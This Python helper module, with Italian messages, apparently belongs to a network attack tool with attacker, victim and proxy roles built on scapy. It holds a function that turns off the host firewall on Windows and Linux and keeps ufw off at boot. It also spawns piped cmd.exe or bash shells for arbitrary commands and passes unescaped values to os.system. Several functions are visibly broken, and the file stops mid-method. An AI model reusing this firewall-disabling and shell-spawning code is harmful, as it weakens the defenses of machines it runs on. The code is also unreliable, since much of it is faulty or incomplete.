#from scapy.all import *
from scapy.all import IP, ICMP, Raw,  Ether, IPv6, ICMPv6ND_NS, ICMPv6NDOptSrcLLAddr, ICMPv6NDOptDstLLAddr
from scapy.all import sr1, sendp, AsyncSniffer, get_if_hwaddr, in6_getnsma, in6_getnsmac, srp1, send
from scapy.all import conf 

import string
import re
import argparse
import socket
import urllib.request
import sys
import subprocess
import ipaddress 
import threading 
import os
import time 

CONFIRM_ATTACKER="__CONFIRM_ATTACKER__"
CONFIRM_VICTIM="__CONFIRM_VICTIM__"
CONFIRM_PROXY="__CONFIRM_PROXY__"
CONFIRM_COMMAND="__CONFIRM_COMMAND__"
ATTACK_FUNCTION="__ATTACK_FUNCTION__"
LAST_PACKET="__LAST_PACKET__"
WAIT_DATA="__WAIT_DATA__"
END_COMMUNICATION="__END_COMMUNICATION__"
END_DATA="__END_DATA__"

exit_cases=["exit","quit",END_COMMUNICATION]

systemsDictionary={
    'aix':"AIX",
    'android':"Android",
    'emscripten':"Emscripten",
    'ios':"iOS", 
    'linux':"Linux", 
    'darwin':"macOS", 
    'win32':"Windows", 
    'cygwin':"Windows/Cygwin", 
    'wasi':"WASI" 
} 
 
def get_wrong_ipaddress(proxy_list:list):
    wrong_ips=[]
    for proxy in proxy_list:
        try:  
            if IP_INTERFACE.is_valid_ipaddress(proxy) is None: 
                wrong_ips.append(proxy)
        except Exception as e: 
            print(f"\tcheck_proxy_ipaddress: {e}") 
            wrong_ips.append(proxy)
    return wrong_ips  

def check_ipaddress(ip_address:ipaddress.IPv4Address): 
        if isinstance(ip_address, ipaddress.IPv4Address) or isinstance(ip_address, ipaddress.IPv6Address): 
            return True 
        elif isinstance(ip_address, str):
            try:
                ipaddress.ip_address(ip_address) 
                return True
            except Exception as e:
                print(f"is_valid_ipaddress: {e}", file=sys.stderr)  
                return False 
        else: return False 

#------SHELL METHODS------

def disable_firewall():
    print("Disabilitando il firewall")
    if sys.platform == "win32":
        print("Il sistema è Windows...")
        #check its current status -> Get-NetFirewallProfile | Format-Table -Property Name, Enabled
        command="Get-NetFirewallProfile | Format-Table -Property Name, Enabled"
        process_shell= subprocess.Popen(
            ["powershell", "-Command", command], 
            stdin=subprocess.PIPE
            ,stdout=subprocess.PIPE
            ,stderr=subprocess.PIPE
            ,text=True
            ,bufsize=1
        ) 
        stdout, stderr = process_shell.communicate()
        if stderr: 
            raise Exception(f"line 345 disable_firewall: {stderr}")  
        #print("Stato iniziale dei profili")
        for line in stdout.split("\n"):
            if any((profile in line) for profile in ["Domain", "Private", "Public"]): 
                #print(f"\tRisultato del profilo: {line}") 
                pass
        process_shell.wait() 
        #disable the Windows Firewall for all profiles -> Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
        command="Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False"
        process_shell= subprocess.Popen(
            ["powershell", "-Command", command], 
            stdin=subprocess.PIPE
            ,stdout=subprocess.PIPE
            ,stderr=subprocess.PIPE
            ,text=True
            ,bufsize=1
        )
        stdout, stderr = process_shell.communicate() 
        if stderr: 
            raise Exception(f"line 363 disable_firewall: {stderr}")
        process_shell.wait() 
        #verify that the changes have taken effect -> Get-NetFirewallProfile | Format-Table -Property Name, Enabled
        #command="Get-NetFirewallProfile | Format-Table -Property Name, Enabled"
        #process_shell= subprocess.Popen(
        #    ["powershell", "-Command", command], 
        #    stdin=subprocess.PIPE
        #    ,stdout=subprocess.PIPE
        #    ,stderr=subprocess.PIPE
        #    ,text=True
        #    ,bufsize=1
        #)
        #stdout, stderr = process_shell.communicate() 
        #if stderr: 
        #    raise Exception(f"line 378 disable_firewall: {stderr}") 
        #print("Controllato il risutlato su tutti i profili")
        #for line in stdout.split("\n"):  
        #    if any((profile in line) for profile in ["Domain", "Private", "Public"]):
        #        if "True" in line:
        #            raise Exception(f"Profilo non disabilitato: {line}")
        #        #print(f"\tRisultato del profilo: {line}") 
        print("Tutti i profili disabilitati. Firewall disabilitato con successo") 
        process_shell.wait()
    elif sys.platform=="linux":
        print("Il sistema è Linux...")
        #Is the ufw running?
        command="sudo ufw status"
        process_shell= subprocess.Popen(
            ["bash", "-c", command] 
            ,stdin=subprocess.PIPE 
            ,stdout=subprocess.PIPE 
            ,stderr=subprocess.PIPE 
            ,text=True
            ,bufsize=1
        )
        stdout, stderr = process_shell.communicate()
        if stderr: 
            raise Exception(f"line 401 disable_firewall: {stderr}")  
        #print("Stato iniziale del firewall")
        for line in stdout.split("\n"): 
            if any((stato in line) for stato in ["attivo", "active"]): 
                #print(f"\t{line}")  
                pass
        process_shell.wait() 
        #Stop the ufw on Linux
        command="sudo ufw disable"
        process_shell= subprocess.Popen(
            ["bash", "-c", command] 
            ,stdin=subprocess.PIPE 
            ,stdout=subprocess.PIPE 
            ,stderr=subprocess.PIPE 
            ,text=True
            ,bufsize=1
        )
        stdout, stderr = process_shell.communicate()
        if stderr:
            raise Exception(f"line 421 disable_firewall: {stderr}")
        if stdout:
            #print(f"{stdout}") 
            pass
        process_shell.wait()
        #Disable the ufw on Linux at boot time
        command="sudo systemctl disable ufw"
        process_shell= subprocess.Popen(
            ["bash", "-c", command] 
            ,stdin=subprocess.PIPE 
            ,stdout=subprocess.PIPE 
            ,stderr=subprocess.PIPE 
            ,text=True
            ,bufsize=1
        )
        stdout, stderr = process_shell.communicate() 
        process_shell.wait() 
        #Is the ufw running?
        #command="sudo ufw status"
        #process_shell= subprocess.Popen(
        #    ["bash", "-c", command] 
        #    ,stdin=subprocess.PIPE 
        #    ,stdout=subprocess.PIPE 
        #    ,stderr=subprocess.PIPE 
        #    ,text=True
        #    ,bufsize=1
        #)
        #stdout, stderr = process_shell.communicate()
        #if stderr: 
        #    raise Exception(f"line 401 disable_firewall: {stderr}")  
        #print("Stato finale del firewall")
        #for line in stdout.split("\n"): 
        #    if any((stato in line) for stato in ["inattivo", "inactive"]): 
        #        #print(f"\t inattivo: {line}") 
        #        pass
        #    elif any((stato in line) for stato in ["attivo", "active"]):
        #        #print(f"\t attivo: {line}") 
        #        pass 
        print("Tutti i profili disabilitati. Firewall disabilitato con successo")
        process_shell.wait() 
    else:
        raise Exception("Sistema operativo non supportato per l'apertura della shell.") 

def reenable_firewall(): 
    print("Riabilitando il firewall")
    if sys.platform == "win32":
        print("Il sistema è Windows...")  
        #check its current status -> Get-NetFirewallProfile | Format-Table -Property Name, Enabled
        command="Get-NetFirewallProfile | Format-Table -Property Name, Enabled"
        process_shell= subprocess.Popen(
            ["powershell", "-Command", command], 
            stdin=subprocess.PIPE
            ,stdout=subprocess.PIPE
            ,stderr=subprocess.PIPE
            ,text=True
            ,bufsize=1
        ) 
        stdout, stderr = process_shell.communicate()
        if stderr: 
            raise Exception(f"line 466 disable_firewall: {stderr}")  
        #print("Stato iniziale dei profili")
        for line in stdout.split("\n"):
            if any((profile in line) for profile in ["Domain", "Private", "Public"]): 
                #print(f"\tRisultato del profilo: {line}") 
                pass
        process_shell.wait() 
        #disable the Windows Firewall for all profiles -> Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
        command="Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled True"
        process_shell= subprocess.Popen(
            ["powershell", "-Command", command], 
            stdin=subprocess.PIPE
            ,stdout=subprocess.PIPE
            ,stderr=subprocess.PIPE
            ,text=True
            ,bufsize=1
        )
        stdout, stderr = process_shell.communicate() 
        if stderr: 
            raise Exception(f"line 484 disable_firewall: {stderr}")
        #print("Comando eseguito con successo")  
        process_shell.wait()  
        #verify that the changes have taken effect -> Get-NetFirewallProfile | Format-Table -Property Name, Enabled
        #command="Get-NetFirewallProfile | Format-Table -Property Name, Enabled"
        #process_shell= subprocess.Popen(
        #    ["powershell", "-Command", command], 
        #    stdin=subprocess.PIPE
        #    ,stdout=subprocess.PIPE
        #    ,stderr=subprocess.PIPE
        #    ,text=True
        #    ,bufsize=1
        #)
        #stdout, stderr = process_shell.communicate() 
        #if stderr: 
        #    raise Exception(f"line 499 disable_firewall: {stderr}") 
        #print("Controllato il risutlato su tutti i profili")
        #for line in stdout.split("\n"):  
        #    if any((profile in line) for profile in ["Domain", "Private", "Public"]):
        #        if "False" in line:
        #            raise Exception(f"Profilo non riabilitato: {line}")
        #        #print(f"\tRisultato del profilo: {line}")
        print("Tutti i profili riabilitati. firewall riabilitato")
        process_shell.wait() 
    elif sys.platform=="linux":
        print("Il sistema è Linux...") 
        #Is the ufw running?
        command="sudo ufw status" #sudo ufw --version 
        process_shell= subprocess.Popen(
            ["bash", "-c", command] 
            ,stdin=subprocess.PIPE 
            ,stdout=subprocess.PIPE 
            ,stderr=subprocess.PIPE 
            ,text=True
            ,bufsize=1
        )
        stdout, stderr = process_shell.communicate()
        if stderr: 
            raise Exception(f"line 474 disable_firewall: {stderr}")  
        #print("Stato iniziale del firewall")
        for line in stdout.split("\n"): 
            if any((stato in line) for stato in ["inattivo", "inactive"]): 
                #print(f"\t inattivo: {line}") 
                pass
            elif any((stato in line) for stato in ["attivo", "active"]):
                #print(f"\t attivo: {line}") 
                pass
        process_shell.wait() 
        #Enable the ufw on Linux at boot time
        command="sudo systemctl enable ufw"
        process_shell= subprocess.Popen(
            ["bash", "-c", command] 
            ,stdin=subprocess.PIPE 
            ,stdout=subprocess.PIPE 
            ,stderr=subprocess.PIPE 
            ,text=True
            ,bufsize=1
        )
        stdout, stderr = process_shell.communicate()
        #if stderr:
        #    raise Exception(f"line 437 disable_firewall: {stderr}")
        for line in stdout.split("\n"): 
            if "Created" in line:
                #print(f"Disabled ufw at boot time: {line}") 
                pass
        process_shell.wait() 
        #Start the ufw on Linux
        command="sudo ufw enable"
        process_shell= subprocess.Popen(
            ["bash", "-c", command] 
            ,stdin=subprocess.PIPE 
            ,stdout=subprocess.PIPE 
            ,stderr=subprocess.PIPE 
            ,text=True
            ,bufsize=1
        )
        stdout, stderr = process_shell.communicate()
        if stderr:
            raise Exception(f"line 421 disable_firewall: {stderr}")
        if stdout:
            #print(f"{stdout}") 
            pass
        process_shell.wait()
        #Is the ufw running?
        #command="sudo ufw status" #sudo ufw --version 
        #process_shell= subprocess.Popen(
        #    ["bash", "-c", command] 
        #    ,stdin=subprocess.PIPE 
        #    ,stdout=subprocess.PIPE 
        #    ,stderr=subprocess.PIPE 
        #    ,text=True
        #    ,bufsize=1
        #)
        #stdout, stderr = process_shell.communicate()
        #if stderr: 
        #    raise Exception(f"line 474 disable_firewall: {stderr}")  
        #print("Stato finale del firewall")
        #for line in stdout.split("\n"): 
        #    if any((stato in line) for stato in ["inattivo", "inactive"]): 
        #        #print(f"\t inattivo: {line}") 
        #        pass
        #    elif any((stato in line) for stato in ["attivo", "active"]):
        #        #print(f"\t attivo: {line}") 
        #        pass 
        print("Tutti i profili riabilitati. firewall riabilitato")
        process_shell.wait() 
    else: 
        raise Exception(  "Sistema operativo non supportato per l'apertura della shell")


#------STRING METHODS------
def sanitize(stringa):
    if type(stringa) is not str or string is None:
        raise Exception("Stringa non valida")
    stringa = ''.join(
        char if char in string.printable 
        else'' 
        for char in stringa
    ) 
    return stringa.strip() 


#------BOOLEAN METHODS------
def is_scelta_SI_NO(scelta:str=None):
    if not isinstance(scelta,str): 
         return False
    is_scelta_yes=False 
    whitebox=["yes","si","yeah"]
    for x in whitebox:
        if scelta!="" and (is_scelta_yes or x.startswith(scelta) or x in scelta):
            is_scelta_yes=True
            break 
    return is_scelta_yes

def print_dictionary(dictionary:dict=None):
    if not isinstance(dictionary,dict):
        raise Exception("print_dictionary: Dizionario passato non valido") 
    elif len(dictionary)<=0:
        print("Il dizionario è vuoto")
        return
    print("Valori presenti:")
    for key, value in dictionary.items():
        print(f"\t{key}\t\t{value}") 

def ask_bool_choice(msg:str):
    if not isinstance(msg, str):
        raise Exception("ask_bool_choice: Il messaggio non è una stringa")
    return is_scelta_SI_NO(input(f"{msg}"))

def ping_once(ip_dst:ipaddress.IPv4Address=None, iface:str=None, timeout=1): 
    if IS_TYPE.string(iface) and IS_TYPE.ipaddress(ip_dst):  
        os.system(f"ping6 -c 1 {ip_dst.compressed}%{iface}")
    else: raise Exception("L'indirizzo non è ne un 'ipaddress.IPv4Address' ne un 'ipaddress.IPv6Address'") 

#------------------------
class PARSER(): 
    def add_argument(param_arg, parser=None):
        if parser is None:
            raise Exception("Parser nullo")
        if len(param_arg)!=3:
            raise Exception("Numero di parametri non corretto")
        if type(param_arg[0]) is not str: 
            raise Exception("L'argomento non è una stringa")
        if type(param_arg[2]) is not str: 
            raise Exception("Il messaggio di aiuto non è una stringa")
        if not param_arg[0].startswith("--") and not param_arg[0].startswith("-"):
            raise Exception("L'argomento deve iniziare con - oppure con --")
        return parser.add_argument(param_arg[0],type=param_arg[1], help=param_arg[2])

    def print_supported_arguments(parser:argparse.ArgumentParser=None): 
        if IS_TYPE.ArgumentParser(parser): 
            print("Controlla di inserire due volte - per gli argomenti")
            print("Argomenti supportati:") 
            for action in parser._actions:
                print("\t{arg}: {help}".format(
                    arg=action.option_strings[0],
                    help=action.help
                )) 

    def check_arguments(parser: argparse.ArgumentParser = None): 
        if IS_TYPE.ArgumentParser(parser):  
            args, unknown = parser.parse_known_args()  
            return args, unknown 
        return None, None

#------------------------
class CALC(): 
    def checksum(data: bytes) -> int:
        """
        Calculate the Internet checksum for the given data.
        
        :param data: The data to calculate the checksum for (as bytes).
        :return: The checksum as an integer.
        """
        checksum = 0
        # Process the data in 16-bit chunks 
        for i in range(0, len(data), 2):
            # Combine two bytes into one 16-bit word
            word = data[i] << 8
            if i + 1 < len(data):
                word += data[i + 1]
            checksum += word
            # Handle overflow by adding the carry
            checksum = (checksum & 0xFFFF) + (checksum >> 16)
        
        # One's complement of the result
        checksum = ~checksum & 0xFFFF
        print(f"\tThe checksum of {data} is {checksum}")
        return checksum
    
    def gateway(ip_dst=None):
        ip_reg_pattern=r"\d+\.\d+\.\d+\.\d+" 
        if type(ip_dst) is not str or re.match(ip_reg_pattern, ip_dst) is None :
            raise Exception("IP non valido")
        return ".".join(
            ip_dst.split(".")[index] if index!=3 else "0" 
            for index in range(len(ip_dst.split(".")))
        )

    def gateway_ipv6(ip_dst=None):
        try:
            addr=ipaddress.IPv6Address(ip_dst)
            return addr.exploded[0:4]+"::1"
        except ValueError:
            raise Exception("calc_gateway_ipv6: Indirizzo IPv6 non valido") 

#------------------------
class IP_INTERFACE(): 
    def iface_from_IP(ip_address:ipaddress.IPv4Address=None)-> str|None:
        if IS_TYPE.ipaddress(ip_address):  
            if sys.platform == "win32":
                return IP_INTERFACE._windows_iface_from_IP(ip_address)
            elif sys.platform=="linux": 
                return IP_INTERFACE._linux_iface_from_IP(ip_address) 
            else: return None
        raise Exception("iface_from_IP: Argomenti non validi")
    
    def _windows_iface_from_IP(ip_address:ipaddress.IPv4Address=None): 
        if not IS_TYPE.ipaddress(ip_address): 
            return None
        #route_info = conf.route6.route(str(ip_address)) 
        #route_info = conf.route.route(str(ip_address)) 
        #iface, ip_src = conf.route.route(str(ip_address))[:2] 
        iface=None 
        try:
            iface_command= f"Get-NetIPInterface -InterfaceIndex (Find-NetRoute -RemoteIPAddress {ip_address.exploded} | Select-Object -First 1 -ExpandProperty InterfaceIndex) | Select-Object -First 1 -ExpandProperty InterfaceAlias" 
            #print("Iface Comando", iface_command)
            process=subprocess.run(
                ["powershell","-Command", iface_command]
                ,capture_output=True
                ,text=True
            ) 
            iface=process.stdout.strip() 
            if not iface or len(iface)<1: 
                raise Exception("Interfaccia non ricavata") 
        except Exception as e:
            print(f"_windows_iface_from_IP: {e}") 
        return iface if len(iface)>0 else  None 

    def _linux_iface_from_IP(ip_address:ipaddress.IPv4Address=None): 
        if not IS_TYPE.ipaddress(ip_address): 
            return None  
        try:
            #print(f"Indirizzo IPv{ip_address.version}: {ip_address.compressed}")
            process=subprocess.Popen(
                ["ip", f"-{ip_address.version}", "route", "get", ip_address.exploded],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True 
            )
            stdout, stderr = process.communicate()
            #print(f"Codice di ritorno {process.returncode}", flush=True)
            if process.returncode != 0: 
                raise Exception(f"Errore nel comando: {stderr.strip()}") #Codice di ritorno {process.returncode}
            result_output = stdout.strip()
            #print(f"Output della route: {result_output}",flush=True) 
            if result_output:  
                match_src = re.search(r"\bsrc\s+([\da-fA-F\.:]+)\b", result_output)  
                match_dev = re.search(r"dev (\S+)", result_output)
                if not match_src and not match_dev:
                    raise Exception(f"Impossibile estrarre sorgente o interfaccia da output") 
                #print("match_src: ",match_src)
                #print("match_dev: ",match_dev)
                ip_src=match_src.group(0).replace("src ","").strip()
                iface=match_dev.group(0).replace("dev ","").strip()
                #print(f"Sorgente trovata: {ip_src}")
                #print(f"Interfaccia trovata: {iface}")
                return iface  
        except Exception as e:
            print(f"_linux_iface_from_IP: {e}") 
        return None 

    def default_iface(): 
        return conf.iface
        if sys.platform == "win32":
            return IP_INTERFACE._windows_default_iface()
        elif sys.platform=="linux":
            return IP_INTERFACE._linux_default_iface() 
        else: return IP_INTERFACE._general_default_iface()

    def _general_default_iface(): 
        try:
            iface = conf.iface  # Automatically detects default iface 
            #ip_src = conf.route.route("0.0.0.0")[1] 
            return iface
        except Exception as e:
            print(f"_general_default_iface: {e}")
        return None

    def _windows_default_iface():
        try:
            process = subprocess.Popen(
                ["netsh", "interface", "ipv4", "show", "interfaces"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            stdout, stderr = process.communicate()
            if process.returncode != 0:
                print(f"_windows_default_iface: {stderr.strip()}") 
            lines = stdout.splitlines()
            for line in lines:
                if "Connected" in line:
                    parts = re.split(r"\s{2,}", line.strip())
                    if len(parts) >= 4:
                        iface_name = parts[-1]
                        return iface_name
        except Exception as e:
            print(f"_windows_default_iface: {e}") 
        return None

    def _linux_default_iface():
        try: 
            process=subprocess.Popen(
                ["ip", "route"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True 
            )
            stdout, stderr = process.communicate()
            #print(f"Codice di ritorno {process.returncode}", flush=True)  
            if process.returncode != 0: 
                raise Exception(f"Errore nel codice: {stderr.strip()}") 
                return None
            result_output = stdout.strip()
            if result_output: 
                match_dev = re.search(r"dev (\S+)", result_output)
                if not match_dev:
                    raise Exception(f"Impossibile estrarre sorgente o interfaccia da output") 
                #print("match_dev: ",match_dev) 
                for interface in match_dev: 
                    if "linkdown" not in interface: 
                        iface=interface.replace("dev ","").strip() 
                        #print(f"Interfaccia trovata: {iface}")
                        return iface
        except Exception as e:
            print(f"_linux_default_iface: {e}") 
        return None

    def find_local_IP():
        local_ip=None
        error=""
        try:
            s= socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8",80))
            local_ip=s.getsockname()[0] 
        except Exception as e:
            print(f"Non è stato trovato l'IP locale: {e}")
            error=e
            s.close() 
        finally:
            s.close()
            return local_ip, error

    def find_public_IP():
        return urllib.request.urlopen('https://api.ipify.org').read().decode('utf8')

    def check_mac_in_cache(ipv6_addr:ipaddress.IPv6Address=None, iface_name: str=None): 
        if IS_TYPE.string(iface_name) and IS_TYPE.ipaddress(ipv6_addr) and ipv6_addr.version==6:   
            output = subprocess.check_output(
                ["ip", "-6", "neigh", "show", "dev", iface_name],
                universal_newlines=True
            )
            for line in output.splitlines():
                if ipv6_addr.compressed.lower() in line.lower():
                    match = re.search(r"lladdr\s+([0-9a-f:]{17})", line)
                    if match:
                        print(f"MAC address found in cache: {match}")
                        return match.group(1)
        return None 
    
    def get_macAddress(ip_address:ipaddress.IPv4Address=None):
        if IS_TYPE.ipaddress(ip_address):  
            if sys.platform == "win32":
                return (IP_INTERFACE._windows_macAddr(ip_address)).lower().strip().replace("-",":") 
            elif sys.platform=="linux": 
                return (IP_INTERFACE._linux_macAddr(ip_address)).lower().strip().replace("-",":") 
            else: return None
        raise Exception("get_macAddress: Argomenti non validi") 
    
    def _windows_macAddr(ip_address:ipaddress._BaseAddress): 
        if not IS_TYPE.ipaddress(ip_address):
            return None 
        #command_dst2="arp -a | findstr '192.168.1.17'"
        #restituisce 192.168.1.17  24-77-03-18-7b-74   dinamico
        comando_mac=f"Get-NetNeighbor -IPAddress {ip_address.compressed} "\
            "| Where-Object {$_.State -eq 'Reachable' -or $_.State -eq 'Stale'} "\
            "| Select-Object -First 1 -ExpandProperty LinkLayerAddress " #\ "| Format-Table State, LinkLayerAddress"
        #print(f"Eseguo comando: {comando_mac}")
        process=subprocess.run(
            ["powershell","-Command", comando_mac]
            ,capture_output=True
            ,text=True
        )
        mac_address=process.stdout.strip()
        stderr=process.stderr.strip()
        if not mac_address: 
            print(f"Tabella di routing non contiene  MAC address per {ip_address.compressed}") 
            #print("Provo a ricavarlo tramite l'interfaccia di rete...")
            print(mac_address)
        if stderr or mac_address=="":
            #print(f"Errore nell'esecuzione  del comando: {stderr}") 
            if ip_address.version==6:
                scope_id=ip_address.scope_id 
                while not scope_id: 
                    scope_id=IP_INTERFACE.get_IPv6_scopeID(ip_address) 
                    if not scope_id: 
                        raise Exception(f"get_mac_address: Scope ID non ricavato per l'IP {ip_address.compressed}") 
                comando_interfaccia=f"(Get-NetIPAddress -IPAddress '{ip_address.compressed}%{scope_id}').InterfaceIndex"
            elif ip_address.version==4:
                comando_interfaccia=f"(Get-NetIPAddress -IPAddress '{ip_address.compressed}').InterfaceIndex"
            else:
                raise Exception(f"get_mac_address: IP version not supported {ip_address.version}")
            comando_mac=f"(Get-NetAdapter -InterfaceIndex {comando_interfaccia}).MacAddress"
            #print("Comando",comando_mac) 
            process=subprocess.run(
                ["powershell","-Command", comando_mac]
                ,capture_output=True
                ,text=True
            )
            mac_address=process.stdout.strip() 
            stderr=process.stderr.strip() 
            if not mac_address: 
                print("MAC address non ricavato")
            if stderr or mac_address=="":
                #print(f"Errore nell'esecuzione  del comando: {stderr}") 
                raise Exception(f"get_mac_address: Impossibile ricavare MAC address per l'IP {ip_address.compressed}")
        print(f"MAC for {ip_address}:{mac_address}")
        return mac_address
    
    def _linux_macAddr(ip_address:ipaddress.IPv4Address=None): 
        if not IS_TYPE.ipaddress(ip_address): 
            return None 
        command_gateway=f"ip -{ip_address.version} route get {ip_address.compressed} | grep -o 'via [^ ]*' |awk '{{print $2}}'" #IP src gateway che raggiunge la destinazione
        process=subprocess.run(
            ["bash","-c", command_gateway]
            ,capture_output=True
            ,text=True
        )
        ip_gateway=process.stdout.strip() 
        stderr=process.stderr.strip() 
        #print("IP source gateway:", ip_gateway)
        if not ip_gateway or ip_gateway.strip()=="":
            ip_gateway=ip_address.compressed
        command_mac=f"ip -{ip_address.version} neigh show $({ip_gateway}) | grep -o 'lladr [^ ]*' | awk '{{print $2}}'" #MAC gateway che raggiunge la destinazione
        process=subprocess.run(
            ["bash","-c", command_mac]
            ,capture_output=True
            ,text=True
        )
        mac_address=process.stdout.strip() 
        stderr=process.stderr.strip() 
        if not mac_address: 
            print("MAC address della sorgente non ricavato")   
        if stderr or mac_address=="":
            print(f"Errore nell'esecuzione  del comando: {stderr}") 
        print(f"MAC for {ip_address}:{mac_address}")
        return mac_address 

    def get_IPv6_scopeID(ip_addr:ipaddress.IPv6Address=None): 
        if IS_TYPE.ipaddress(ip_addr) and ip_addr.version==6:
            scope_id=ip_addr.scope_id 
            while not scope_id: 
                if sys.platform == "win32": 
                    #command_scopeID="(Get-NetIPAddress -AddressFamily IPv6 | Where-Object {$_.IPAddress -like "+f"'{ip_dst.compressed}*'"+"}).InterfaceIndex"
                    command_scopeID=f"(Find-NetRoute -RemoteIPAddress '{ip_addr.compressed}' | Select-Object -First 1).InterfaceIndex" 
                    process=subprocess.run(
                        ["powershell","-Command", command_scopeID]
                        ,capture_output=True
                        ,text=True
                    )
                    scope_id=process.stdout.strip() 
                    if not scope_id: 
                        print("Scope ID non ricavato")
                elif sys.platform=="linux": 
                    if ip_addr.version==4:
                        command=f"arp -n {ip_addr.compressed} | grep {ip_addr.compressed} | awk 'NR>1 {{print $5}}'"
                    elif ip_addr.version==6:
                        command=f"ip -6 neigh show {ip_addr.compressed} | grep {ip_addr.compressed} | awk '{{print $3}}'"
                    else: raise Exception("Versione IP non implementata")
                    #command_scopeID= ip -{ip_addr.version} route get {ip_addr.compressed} | awk '{for(i=1;i<=NF;i++){if($i=="dev"){print $(i+1)}}}'
                    command_scopeID=f"ip -{ip_addr.version} route get {ip_addr.compressed} | grep -o 'dev [^ ]*' |awk '{{print $2}}'" 
                    process_shell= subprocess.Popen(
                        ["bash", "-c", command_scopeID] 
                        ,stdin=subprocess.PIPE 
                        ,stdout=subprocess.PIPE 
                        ,stderr=subprocess.PIPE 
                        ,text=True
                        ,bufsize=1
                    )
                    scope_id=process.stdout.strip() 
                    if not scope_id or scope_id=="" or scope_id.lower()=="incomplete":
                        process_shell= subprocess.Popen( ["ping", "-c 1", ip_addr.compressed]) 
                        print("Scope ID non ricavato")
                else: 
                    print("Sistema operativo non supportato per il recupero dello scope ID")
            return scope_id
        return None
      
    def is_valid_ipaddress(ip_address:ipaddress.IPv4Address): 
        if isinstance(ip_address, ipaddress.IPv4Address) or isinstance(ip_address, ipaddress.IPv6Address): 
            return True
        elif isinstance(ip_address, str):
            try:
                ipaddress.ip_address(ip_address) 
                return True
            except Exception as e:
                print(f"is_valid_ipaddress: {e}", file=sys.stderr)  
                return False 
        else: return False
#------------------------
class IS_TYPE(): 
    def callable_function(callback_function=None):
        #the type of a function can be 'function' or 'method' 
        if callable(callback_function): 
            return True
        print(f"callable_function: callback function invalida {callback_function}") 
        return False  
    
    def ipaddress(ip_address:ipaddress.IPv4Address): 
        if isinstance(ip_address, ipaddress.IPv4Address) or isinstance(ip_address, ipaddress.IPv6Address): 
            return True 
        print(f"ipaddress: Indirizzo IP invalido {ip_address}") 
        return False

    def time(timeout_time:int|float=None):    
        if isinstance(timeout_time, (int, float)): 
            return True
        print(f"IS_TYPE.time\tTempo invalido {timeout_time}") 
        return False 

    def threading_Event(event:threading.Event=None):
        if isinstance(event, threading.Event): 
            return True
        print(f"is_threading_Event: event non è un threading.Event {type(event)}") 
        return False 

    def dictionary(args:dict=None):
        if isinstance(args, dict):
            return True
        print(f"is_dictionary: Argomenti non validi {args}") 
        return False
    
    def AsyncSniffer(sniffer:AsyncSniffer=None):
        if isinstance(sniffer,AsyncSniffer): 
            return True
        print(f"is_AsyncSniffer: lo sniffer non è valido {sniffer}") 
        return False 

    def threading_Timer(timer:threading.Timer=None):
        if isinstance(timer, threading.Timer): 
            return True
        print(f"is_threading_Timer: timer non è un threading.Timer {type(timer)}")
        return False 

    def list(lista:list=None):
        if isinstance(lista,list): 
            return True  
        print(f"is_list: lista non è una lista {lista}") 
        return False
    
    def string(stringa:str=None):
        if isinstance(stringa,str):
            return True
        print(f"is_string: stringa non valida {stringa}")
        return False 

    def bytes(byte:bytes=None):
        if isinstance(byte,bytes): 
            return True
        print(f"is_bytes: byte non valido {byte}") 
        return False 

    def integer(integer:int=None):
        if isinstance(integer,int): 
            return True
        print(f"is_integer: int non valido {integer}")
        return False 

    def boolean(booleano:bool=None):
        if isinstance(booleano,bool): 
            return True
        print(f"is_boolean: booleano non valido {booleano}")
        return False 

    def threading_lock(lock:threading.Lock=None):
        if isinstance(lock,type(threading.Lock())): 
            return True
        print(f"is_threading_lock: lock non valido {lock}")
        return False 

    def is_valid_shell(shell:subprocess.Popen[str]=None):
        if isinstance(shell, subprocess.Popen): 
            return True
        print(f"is_valid_shell: shell non valida {shell}")
        return False 

    def ArgumentParser(parser:argparse.ArgumentParser=None): 
        if isinstance(parser, argparse.ArgumentParser): 
            return True
        print(f"ArgumentParser: parser non valido {parser}")
        return False 

#------------------------
class GET(): 
    def threading_Event()->threading.Event: 
        return threading.Event() 

    def AsyncSniffer(args:dict=None): 
        if not IS_TYPE.dictionary(args): 
            raise Exception(f"GET:AsyncSniffer\targs is not a dictionary") 
        if SNIFFER.check_args(args):
            return AsyncSniffer( **args ) 
        print("AHAHAHAH")
        return None

    def timer(timeout_time=60, callback_function=None): 
        if IS_TYPE.callable_function(callback_function) and (timeout_time is None or IS_TYPE.time(timeout_time)): 
            return threading.Timer(timeout_time, callback_function)
        return None 

    def shellProcess():
        if sys.platform == "win32":
            print("Il sistema è Windows...")
            return subprocess.Popen(
                ["cmd.exe"], 
                stdin=subprocess.PIPE
                ,stdout=subprocess.PIPE
                ,stderr=subprocess.PIPE
                ,text=True
                ,bufsize=1
            )
        elif sys.platform=="linux":
            print("Il sistema è Linux...")
            return subprocess.Popen(
                ["bash"] 
                ,stdin=subprocess.PIPE 
                ,stdout=subprocess.PIPE 
                ,stderr=subprocess.PIPE 
                ,text=True
                ,bufsize=1
            )
        print("Sistema operativo non supportato per l'apertura della shell.") 

    def shellProcess_command(command:str): 
        if not IS_TYPE.string(command): 
            print("Il comando non è una stringa")
            return  
        if sys.platform == "win32":
            print("Il sistema è Windows...")
            return subprocess.Popen(
                ["cmd.exe", "/c", command], 
                stdin=subprocess.PIPE
                ,stdout=subprocess.PIPE
                ,stderr=subprocess.PIPE
                ,text=True
                ,bufsize=1
            )
        elif sys.platform=="linux":
            print("Il sistema è Linux...")
            return subprocess.Popen(
                ["bash", "-c", command] 
                ,stdin=subprocess.PIPE 
                ,stdout=subprocess.PIPE 
                ,stderr=subprocess.PIPE 
                ,text=True
                ,bufsize=1
            )
        print("Sistema operativo non supportato per l'apertura della shell.") 

#------------------------
class THREAD(): 
    def get_thread_response(proxy:ipaddress.IPv4Address=None,thread_lock:threading.Lock=None,thread_response:dict=None,response:bool=True):
        if IS_TYPE.ipaddress(proxy) and IS_TYPE.threading_lock(thread_lock) and IS_TYPE.dictionary(thread_response) and IS_TYPE.boolean(response):
            response=None
            thread_lock.acquire()
            response=thread_response.get(proxy.compressed)
